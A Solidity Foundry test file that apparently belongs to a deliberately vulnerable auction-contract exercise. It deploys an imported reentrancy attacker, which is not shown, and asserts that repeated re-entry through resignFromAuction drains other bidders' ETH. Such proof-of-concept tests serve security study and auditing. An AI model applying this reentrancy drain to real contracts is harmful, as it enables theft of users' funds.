// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./VeriAuctionTokenForEth_problems_setup.t.sol";

// Attacker
import "./Attackers/VeriAuctionTokenForEth_reentrancy_attacker.sol";

contract VeriAuctionTokenForEth_problems_test is VeriAuctionTokenForEth_problems_setup {
    //========================================
    // Variables
    //========================================
    VeriAuctionTokenForEth_reentrancy_attacker attacker;

    //========================================
    // setup
    //========================================

    function setUp() public {
        veriAuctionTokenForEth_problems_setup();
        startAuction();

        attacker = new VeriAuctionTokenForEth_reentrancy_attacker();

        attacker.setTimesToAttack(3);
        attacker.setClaimTokensDuringAttack(false);
    }

    //========================================
    // Helpers
    //========================================

    function commitMultipleUsers(uint256 commitmentAttacker) internal {
        vm.assume(address(attacker) != bob);
        vm.assume(address(attacker) != charlie);

        uint256 commitmentOfAttacker = commitmentAttacker;
        commitEthToAuction(address(attacker), commitmentOfAttacker);

        // Make sure that there is enough ETH in the auction contract.
        uint256 commitmentOfBob = commitmentOfAttacker * attacker.timesToAttack();
        commitEthToAuction(bob, commitmentOfBob);

        // Add a little bit extra ETH to the auction contract.
        uint256 commitmentOfCharlie = 1 ether;
        commitEthToAuction(charlie, commitmentOfCharlie);
    }

    //========================================
    // tests
    //========================================

    //====================
    // commitTokens()
    //====================

    function testReentrancyResignFromAuctionMultipleTimes() public {
        //----------
        // Setup
        //----------

        uint256 commitmentOfAttacker = 1 ether;
        commitMultipleUsers(commitmentOfAttacker);

        uint256 attackTimes = attacker.timesToAttack();

        //----------
        // Execute
        //----------

        vm.prank(address(attacker));
        veriAuction.resignFromAuction();

        //----------
        // Test
        //----------

        uint256 newAttackerBalance = address(attacker).balance;
        uint256 expectedNewAttackerBalance = commitmentOfAttacker + commitmentOfAttacker * attackTimes;
        assertEq(newAttackerBalance, expectedNewAttackerBalance);

        assertEq(token.balanceOf(address(attacker)), 0);
    }

    function testReentrancyResignFromAuctionAndClaimTokensOnFinalizedAuction() public {
        //----------
        // Setup
        //----------

        uint256 commitmentOfAttacker = 1 ether;
        commitMultipleUsers(commitmentOfAttacker);

        attacker.setClaimTokensDuringAttack(true);

        veriAuction.finalize();

        vm.prank(address(attacker));
        uint256 claimableAmount = veriAuction.calculateClaimableAmount();

        assertEq(address(attacker).balance, 0);
        assertEq(token.balanceOf(address(attacker)), 0);

        //----------
        // Execute
        //----------

        vm.prank(address(attacker));
        veriAuction.resignFromAuction();

        //----------
        // Test
        //----------

        assertEq(address(attacker).balance, commitmentOfAttacker);
        assertEq(token.balanceOf(address(attacker)), claimableAmount);
    }
}
